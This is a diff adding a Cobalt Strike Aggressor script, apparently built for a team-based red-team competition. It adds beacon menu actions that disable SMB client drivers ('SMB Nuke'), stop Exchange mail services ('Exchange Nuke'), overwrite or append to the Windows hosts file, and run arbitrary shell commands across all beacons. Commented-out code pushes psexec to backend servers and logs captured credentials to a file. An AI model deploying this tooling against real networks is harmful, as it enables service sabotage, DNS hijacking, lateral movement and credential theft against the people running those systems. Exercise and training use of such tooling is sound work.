@@ -1,0 +1,128 @@
+# %table["192.168.1.*"] = "Team 1";
+# %table["192.168.2.*"] = "Team 2";
+# %table["192.168.3.*"] = "Team 3";
+# %table["192.168.4.*"] = "Team 4";
+# %table["192.168.5.*"] = "Team 5";
+# %table["192.168.6.*"] = "Team 6";
+# %table["192.168.7.*"] = "Team 7";
+# %table["192.168.8.*"] = "Team 8";
+# %table["192.168.9.*"] = "Team 9";
+# %table["192.168.10.*"] = "Team 10";
+# %table["192.168.11.*"] = "Team 11";
+# %table["192.168.12.*"] = "Team 12";
+# %table["192.168.13.*"] = "Team 13";
+
+
+# on beacon_initial {
+#     handleit($1);
+# }
+
+# sub handleit {
+#     local('$info $int');
+#     $info = beacon_info($1);
+#     $int = $info['internal'];
+#     foreach $key => $value (%table) {
+#         if ($key iswm $int) { bnote($1, $value); return; }
+#     }
+ 
+#     # if we get here, IP is unknown.
+#     binput($1, "IP is not a team IP. Resolving");
+#     bipconfig($1, {
+#         foreach $key => $value (%table) {
+#             if ("* $+ $key" iswm $2) {
+#                 binput($1, "IP info is $2");
+#                 bnote($1, $value);
+#             }
+#         }
+#     });
+# }
+
+# sub ownall {
+# 	bpsexec($1, "192.168.0.10", "HTTP_443", "c\$");
+# 	bpsexec($1, "192.168.0.20", "HTTP_443", "c\$");
+# 	bpsexec($1, "192.168.0.30", "HTTP_443", "c\$");
+# 	bpsexec($1, "192.168.0.40", "HTTP_443", "c\$");
+# 	bpsexec($1, "192.168.0.50", "HTTP_443", "c\$");
+# 	bpsexec($1, "192.168.0.60", "HTTP_443", "c\$");
+# }
+
+sub smbnuke {
+	bshell($1,"sc.exe config lanmanworkstation depend= bowser/mrxsmb10/nsi");
+	bshell($1,"sc.exe config mrxsmb20 start= disabled");
+	bshell($1,"sc.exe config lanmanworkstation depend= bowser/mrxsmb20/nsi");
+	bshell($1,"sc.exe config mrxsmb10 start= disabled");	
+}
+
+sub exchangenuke {
+	bshell($1,"net stop RESvc /y");
+	bshell($1,"net stop POP3Svc /y");
+	bshell($1,"net stop MSExchangeSA /y");
+	bshell($1,"net stop MSExchangeMTA /y");
+	bshell($1,"net stop MSExchangeMGMT /y");
+	bshell($1,"net stop MSExchangeIS /y");
+	bshell($1,"net stop IMAP4SVC /y");
+}
+
+popup beacon_bottom {
+	menu "Misc" {		
+		item "Add Host File Entry" {
+			prompt_text("Specify an entry to add to the host file:", "127.0.0.1 google.com", lambda({
+				bshell(@ids, 'echo ' . $1 . ' >> c:\\windows\\System32\\Drivers\\Etc\Hosts');
+				blog(@ids,"Adding the following entry to the host file: $1 ");
+				bshell(@ids, "ipconfig /flushdns");
+			}, @ids => $1));
+		}
+		item "Replace Host File" {
+			prompt_file_open("Choose a file to replace the current host file:", "hosts.txt", false, lambda({
+				bcd(@ids,"c:\\windows\\system32\\drivers\\etc");
+				brm(@ids,"hosts");
+				blog(@ids,"Uploading file $1 to c:\\windows\\system32\\drivers\\etc\\hosts");
+				bupload(@ids,$1);
+				bshell(@ids, "ipconfig /flushdns");
+				blog(@ids,"File uploaded and DNS flushed. Done!");
+			}, @ids => $1));
+		}
+	}
+
+	#author: Raphael Mudge
+	#https://www.cobaltstrike.com/aggressor-script/beacon.html
+	item "Run All (cmd)" {
+		prompt_text("Which shell command to run?", "whoami /groups", lambda({
+			binput(@ids, "shell $1");
+			bshell(@ids, $1);
+		}, @ids => $1));
+		}
+	item "SMB Nuke"{
+			local('$bid');
+		foreach $bid ($1) {
+			smbnuke($bid);
+			}
+
+	}
+	# item "Own Backend"{
+	# 	local('$bid');
+	# 	foreach $bid ($1) {
+	# 		ownall($bid);
+	# 		}
+	# }
+	item "Exchange Nuke"{
+		local('$bid');
+		foreach $bid ($1) {
+			exchangenuke($bid);
+			}
+	}
+		item "Label Beacons"{
+		local('$bid');
+		foreach $bid ($1) {
+			handleit($bid);
+			}
+	}
+
+}
+
+# on credentials {
+#     local('$handle');
+#     $handle = openf(">>creds.txt");	
+#     println($handle,"$1");
+#     closef($handle);
+# }
